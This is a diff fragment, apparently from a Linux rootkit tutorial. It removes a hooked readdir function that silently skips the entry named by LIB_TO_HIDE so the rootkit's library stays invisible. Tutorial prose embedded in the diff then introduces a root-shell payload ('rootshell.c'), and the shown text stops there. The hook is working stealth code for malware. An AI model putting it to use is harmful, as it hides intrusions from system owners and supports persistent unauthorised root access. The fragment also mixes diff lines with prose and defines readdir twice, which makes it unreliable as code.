@@ -349,24 +349,6 @@ struct dirent *readdir(DIR *dirp) {
     return NULL;
 }
 
-// Hook readdir (used by standard C programs)
-struct dirent *readdir(DIR *dirp) {
-    static struct dirent *(*orig_readdir)(DIR *) = NULL;
-    if (!orig_readdir) {
-        orig_readdir = dlsym(RTLD_NEXT, "readdir");
-    }
-
-    struct dirent *entry;
-    while ((entry = orig_readdir(dirp)) != NULL) {
-        // If it matches, skip it and get the next entry
-        if (strcmp(entry->d_name, LIB_TO_HIDE) == 0) {
-            continue;
-        }
-        return entry;
-    }
-    return NULL;
-}
-
 So far we have looked at intercepting/redirecting for stealth. Hiding the module itself as well as hiding the entry in virtual memory. What's the point? Well let's say the rootkits primary payload is a rootshell. which could be done with the following code.
 
 /* rootshell.c */
